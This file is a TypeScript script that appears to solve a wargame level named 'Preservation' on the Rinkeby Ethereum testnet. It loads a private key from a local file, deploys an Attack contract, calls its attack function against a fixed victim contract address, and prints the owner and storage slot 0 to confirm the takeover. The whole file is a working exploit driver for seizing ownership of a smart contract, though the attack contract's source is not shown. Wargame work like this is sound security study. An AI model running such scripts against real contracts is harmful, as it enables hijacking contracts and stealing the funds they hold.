import { getDefaultProvider } from '@ethersproject/providers';
import { Wallet, utils } from 'ethers';
import { readFileSync } from 'fs-extra';
import path from 'path/posix';
import { Attack__factory, Preservation__factory } from '../types/ethers-contracts';

// import {  } from '../types/ethers-contracts';

// const provider = getDefaultProvider("http://127.0.0.1:8545");
const provider = getDefaultProvider("rinkeby");
const testPrivKey = readFileSync(path.resolve(__dirname, "./../../../.privkey")).toString().trim();
// const testPrivKey = "";
const addr = "0xC9034dD41d9311729F1d98895A2078CF54414A21"

function toWei(eth: number) {
  return utils.parseEther(eth.toString())
}

async function main() {
  let alice = new Wallet(testPrivKey);
  alice = alice.connect(provider);

  const victim = Preservation__factory.connect(addr, provider).connect(alice);

  (new Attack__factory(alice)).deploy().then(async attack => {
    console.log("deployed: " + attack.address)
    console.log(await provider.getStorageAt(addr, 0))
    await attack.attack(addr, {
      gasLimit: 1000000
    }).then(res => console.log(res)).catch(e => console.log(e))
    console.log("attacked")
    console.log(await victim.owner())
    console.log(await provider.getStorageAt(addr, 0))
  })

}

main()
